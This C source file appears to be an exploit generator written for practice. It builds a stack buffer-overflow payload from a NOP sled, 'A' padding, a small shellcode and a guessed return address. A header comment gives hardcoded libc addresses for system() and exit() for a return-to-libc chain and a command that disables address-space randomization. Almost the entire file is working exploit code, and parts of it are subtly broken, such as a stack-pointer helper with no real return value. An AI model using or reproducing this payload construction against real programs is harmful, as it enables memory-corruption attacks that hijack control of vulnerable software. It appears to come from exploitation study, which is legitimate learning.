#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * Example of inject c code
 * libc - system add : 0x7ffff7e2bcd0
 * libc - exit : 0x7ffff7e213c0
 * shell env : 0x7fffffffe01b
 * disable randomize stack sudo sysctl -w kernel.randomize_va_space=0
 */

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

char shellcode[] =
    "\xd0\xbc\xe2\xf7\xff\x7f" // system()
    "\xc0\x13\xe2\xf7\xff\x7f" // exit()
    "\x1b\xe0\xff\xff\xff\x7f";

char shellcode2[] =
    "\xb8\x01\x00\x00\x00"
    "\xbb\x05\x00\x00\x00"
    "\xcd\x80";

unsigned long *
get_sp(void)
{
    __asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[])
{
    char *buff, *ptr;
    unsigned long *addr_ptr, addr;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i;

    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);

    if (!(buff = malloc(bsize + 9)))
    {
        printf("Can’t allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    fprintf(stderr, "Size of PTR: %ldb\n", sizeof(unsigned long *));
    fprintf(stderr, "Using address : 0x%lx\n", addr);
    fprintf(stderr, "Shell code len %lu\n", strlen(shellcode2));
    ptr = buff;
    addr_ptr = (unsigned long *)ptr;
    for (i = 0; i < bsize / 2; i++)
        *(ptr++) = NOP;
    // ptr = buff + (bsize /2);
    for (i = 0; i < (bsize - (bsize / 2) - (strlen(shellcode2))); i++)
        *(ptr++) = 'A';
    // ptr = buff + (bsize - (strlen(shellcode)));
    for (i = 0; i < strlen(shellcode2); i++)
        *(ptr++) = shellcode2[i];
    *((unsigned long *)ptr) = addr;
    // buff[bsize + 9 - 1] = '\0';
    // memcpy(buff, "BUF=", 4);
    printf("%s", buff);
}